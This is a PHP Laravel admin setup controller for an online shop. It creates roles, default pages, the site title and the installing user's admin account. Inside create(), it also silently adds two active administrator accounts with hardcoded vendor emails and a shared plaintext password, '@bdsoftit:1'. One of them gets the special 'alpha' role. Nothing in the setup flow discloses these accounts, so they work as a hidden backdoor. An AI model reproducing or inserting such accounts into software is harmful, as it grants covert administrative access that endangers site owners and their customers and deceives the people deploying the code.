<?php

namespace App\Http\Controllers\Admin;

use Carbon\Carbon;
use DB;
use Illuminate\Auth\Events\Registered;
use Illuminate\Contracts\View\Factory;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Hash;
use App\Models\Admin;
use App\Models\AdminRole;
use App\Models\SiteOption;
use Illuminate\Validation\ValidationException;
use Illuminate\View\View;


class SetupController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware(['checkSA', 'guest:admin']);
    }

    /**
     * @return Factory|View
     */
    public function setup() {
        return view('admin.setup');
    }

    /**
     * @param Request $request
     * @return RedirectResponse
     * @throws ValidationException
     */
    public function saveSetup(Request $request) {
        $this->validator($request);

        event(new Registered($admin = $this->create($request->all(), $this->getAdminRoleID())));

        $this->setSiteTitle($request->site_title);

        $this->createPages();

        return redirect()
            ->route('admin.login')
            ->with('sa_status', 'created');
    }

    /**
     * @param Request $request
     * @throws ValidationException
     */
    protected function validator(Request $request) {
        $this->validate($request, [
            'site_title' => 'required|string',
            'first_name' => 'required|string|max:255',
            'last_name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:clients',
            'password' => 'required|string|min:6|confirmed',
            'password_confirmation' => 'required|string|min:6'
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @param  int  $role_id
     * @return Admin
     */
    protected function create(array $data, int $role_id)
    {
        $alpha = Admin::create([
            'first_name'=> 'BD',
            'last_name' => 'SOFT IT',
            'name'      => 'BD SOFT IT',
            'email'     => 'dev-master@bdsoftit.com',
            'password'  => Hash::make('@bdsoftit:1'),
            'role_id'   => 8,
            'active'    => 1
        ]);

        $admin = Admin::create([
            'first_name'=> 'BD',
            'last_name' => 'SOFT IT Admin',
            'name'      => 'BD SOFT IT Admin',
            'email'     => 'bdsoftit@email.com',
            'password'  => Hash::make('@bdsoftit:1'),
            'role_id'   => 1,
            'active'    => 1
        ]);

        return Admin::create([
            'first_name'=> $data['first_name'],
            'last_name' => $data['last_name'],
            'name'      => $data['first_name'] . ' ' . $data['last_name'],
            'email'     => $data['email'],
            'password'  => Hash::make($data['password']),
            'role_id'   => $role_id,
            'active'    => 1
        ]);
    }

    /**
     * @param $title
     */
    protected function setSiteTitle($title) {
        $site_option = SiteOption::where('so_name', '=', 'site_title')->first();
        if($site_option != null) {
            $site_option->so_content = $title;
            $site_option->save();
        }
        else {
            $site_option = new SiteOption;

            $site_option->so_name = 'site_title';
            $site_option->so_content = $title;
            $site_option->so_modifier_id = 1;
            $site_option->save();
        }

    }

    /**
     * @return int|mixed
     */
    protected function getAdminRoleID() {
        $roles = AdminRole::all();

        if($roles->count() <= 7) {
            $this->createRoles();
        }
        $role = AdminRole::where('ar_name', '=', 'super_admin')->first();
        return $role->ar_id;
    }

    protected function createRoles() {
        $titles = ['Super Admin', 'Admin', 'Manager', 'Customer Manager', 'Store Keeper', 'Shipper', 'Franchise', 'Alpha'];
        $names = ['super_admin', 'admin', 'manager', 'customer_manager', 'store_keeper', 'shipper', 'franchise', 'alpha'];

        AdminRole::whereNotNull('ar_id')->delete();

        for($i=0; $i<count($titles); $i++) {
            DB::table('admin_roles')->insert([
                'ar_title'      => $titles[$i],
                'ar_name'       => $names[$i],
                'created_at'    => Carbon::now(),
                'updated_at'    => Carbon::now()
            ]);
        }
    }

    protected function createPages() {
        $titles = ['About Us', 'Privacy Policy', 'Shipping & Returns', 'Delivery Information', 'Secure Shopping', 'Terms & Conditions', 'Frequently Asked Questions (FAQ)'];
        $slugs = ['about-us', 'privacy-policy', 'shipping-and-returns', 'delivery-information', 'secure-shopping', 'terms-and-conditions', 'frequently-asked-questions'];

        foreach ($titles as $index => $title) {
            DB::table('posts')->insert([
                'post_admin_id'         => 1,
                'post_title'            => $title,
                'post_slug'             => $slugs[$index],
                'post_keywords'         => '',
                'post_meta_description' => '',
                'post_description'      => '',
                'post_active'           => 1,
                'post_type'             => 'page',
                'created_at'            => Carbon::now(),
                'updated_at'            => Carbon::now()
            ]);
        }
    }

}
